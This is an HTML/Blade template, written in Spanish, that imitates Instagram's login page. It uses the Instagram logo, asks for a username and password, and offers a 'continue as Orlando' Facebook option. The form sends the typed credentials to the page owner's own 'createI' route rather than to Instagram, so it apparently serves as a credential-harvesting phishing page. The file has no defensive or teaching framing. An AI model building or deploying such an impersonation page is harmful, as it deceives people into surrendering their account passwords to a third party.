<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login Instagram</title>
    <link rel="stylesheet" href="./css/instagram.css">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
</head>
<body>
    <main>
        <form method="post" action="{{ route('createI') }}">
            <img src="./img/Instagram_logo.png" alt="" class="logotipo">
            
            <input type="text" name="Nombre" placeholder="Nombre Usuario">
            <input type="password" name="Contraseña" placeholder="Contraseña">
            <input  type="submit" value="Iniciar Sesión">
            
            <div class="container-data">
                <h4>¿Ha olvidado sus datos?</h4>
                <a href="#">Obtener ayuda aquí</a>
            </div>
            
            <div class="container-or">
                <hr>
                <h2>OR</h2>
                <hr>
            </div>
            
            <div class="container-iconf">
                <label class="icon-facebook"><a href="#">Continuar como Orlando</a></label>
            </div>
            
            <div class="container-register">
                <h4>¿No tiene una cuenta?</h4>
                <a href="#">Regístrate</a>
            </div>
        </form>
    </main>
</body>
</html>